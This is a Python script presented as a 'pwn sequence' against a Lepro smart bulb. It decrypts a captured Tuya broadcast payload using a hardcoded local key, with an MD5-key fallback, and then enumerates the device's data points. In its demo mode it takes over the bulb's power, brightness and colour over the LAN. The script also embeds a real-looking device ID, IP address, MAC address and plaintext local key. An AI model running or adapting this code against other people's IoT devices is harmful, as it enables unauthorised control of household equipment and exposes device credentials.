#!/usr/bin/env python3
"""
Lepro Smart Bulb — Full pwn sequence.
1. Decrypt captured pcap payload
2. Enumerate device capabilities (dps)
3. Demonstrate LAN control
"""
import tinytuya
import json
import sys
import time
from Crypto.Cipher import AES
import binascii

DEVICE_ID = "ebbc76a9e9f9b0c0a60nof"
LOCAL_KEY = 'l}WG~Zdv8f}k;O*#'
DEVICE_IP = "192.168.1.82"
DEVICE_MAC = "70:89:76:25:f3:ab"
VERSION = 3.3

print("=" * 60)
print("LEPRO SMART BULB — PWN SEQUENCE")
print("=" * 60)

# === PHASE 1: Decrypt the captured broadcast payload ===
print("\n--- PHASE 1: Decrypt captured broadcast payload ---\n")

ENCRYPTED_PAYLOAD = binascii.unhexlify(
    "d09766676f3369eb10b5e9f132fd802a"
    "53b69b94cff2256e003e6eed67555ff9"
    "6447d9b63734f3299f30caf77083cc98"
    "0be9247e29bc3fbb7cb2d42f53db8aab"
    "c2fb8459b1155fc75d4bf6699f92cba4"
    "c0ba520148045e7605fa0498dfea5aab"
    "32908ad1626e2d7503771cf82556470e"
    "82b84964d4378ebadf3514b9c898d118"
    "6eda8eea40e93b1e3fc14a2570e18279"
    "5cc17d0e"
)

try:
    key_bytes = LOCAL_KEY.encode('latin-1')[:16]
    cipher = AES.new(key_bytes, AES.MODE_ECB)
    decrypted = cipher.decrypt(ENCRYPTED_PAYLOAD)
    padding_len = decrypted[-1]
    if padding_len < 16:
        decrypted = decrypted[:-padding_len]
    decoded = decrypted.decode('utf-8', errors='replace')
    print(f"Decrypted payload ({len(decoded)} bytes):")
    try:
        parsed = json.loads(decoded)
        print(json.dumps(parsed, indent=2))
    except json.JSONDecodeError:
        print(decoded)
except Exception as e:
    print(f"ECB decryption failed: {type(e).__name__}: {e}")
    print("Trying with MD5 of key (Tuya v3.3 uses MD5 hash of local key for broadcasts)...")
    import hashlib
    md5_key = hashlib.md5(LOCAL_KEY.encode('latin-1')).hexdigest()[8:24].encode('latin-1')
    try:
        cipher = AES.new(md5_key, AES.MODE_ECB)
        decrypted = cipher.decrypt(ENCRYPTED_PAYLOAD)
        padding_len = decrypted[-1]
        if padding_len < 16:
            decrypted = decrypted[:-padding_len]
        decoded = decrypted.decode('utf-8', errors='replace')
        print(f"Decrypted with MD5 key ({len(decoded)} bytes):")
        try:
            parsed = json.loads(decoded)
            print(json.dumps(parsed, indent=2))
        except json.JSONDecodeError:
            print(decoded)
    except Exception as e2:
        print(f"MD5 key decryption also failed: {e2}")

# === PHASE 2: Connect and enumerate capabilities ===
print("\n\n--- PHASE 2: Enumerate device capabilities (dps) ---\n")

print(f"Connecting to {DEVICE_IP} (ID: {DEVICE_ID})...")
d = tinytuya.BulbDevice(DEVICE_ID, DEVICE_IP, LOCAL_KEY)
d.set_version(VERSION)

status = d.status()
print(f"\nDevice status response:")
print(json.dumps(status, indent=2, default=str))

if 'dps' in status:
    dps = status['dps']
    print(f"\n  Data Points (dps) found: {len(dps)}")
    
    DPS_MAP = {
        '20': 'Power (on/off)',
        '21': 'Mode (white/colour/scene/music)',
        '22': 'Brightness (10-1000)',
        '23': 'Color Temperature (0-1000)',
        '24': 'Colour (HSV hex)',
        '25': 'Scene Data',
        '26': 'Countdown (seconds)',
    }
    
    for dp_id, value in sorted(dps.items()):
        desc = DPS_MAP.get(dp_id, 'Unknown')
        print(f"    DPS {dp_id:3s}: {value!r:30s}  ({desc})")
else:
    print(f"  Error or no dps: {status}")

# === PHASE 3: Demonstrate control ===
print("\n\n--- PHASE 3: Demonstrate LAN control ---\n")

mode = sys.argv[1] if len(sys.argv) > 1 else "status_only"

if mode == "full_demo":
    print("Toggling bulb OFF...")
    d.turn_off()
    time.sleep(2)
    
    print("Toggling bulb ON...")
    d.turn_on()
    time.sleep(2)
    
    print("Setting brightness to 50%...")
    d.set_brightness_percentage(50)
    time.sleep(2)
    
    print("Setting color to RED...")
    d.set_colour(255, 0, 0)
    time.sleep(2)
    
    print("Setting color to GREEN...")
    d.set_colour(0, 255, 0)
    time.sleep(2)
    
    print("Setting color to BLUE...")
    d.set_colour(0, 0, 255)
    time.sleep(2)
    
    print("Restoring warm white at 100%...")
    d.set_white(255, 255)
    time.sleep(1)
    
    print("\nFull control demonstration complete.")
else:
    print("Status-only mode. Run with 'full_demo' argument to toggle/color the bulb.")
    print("  python3 pwn_bulb.py full_demo")

print("\n\nDONE — Bulb is fully compromised via LAN control.")
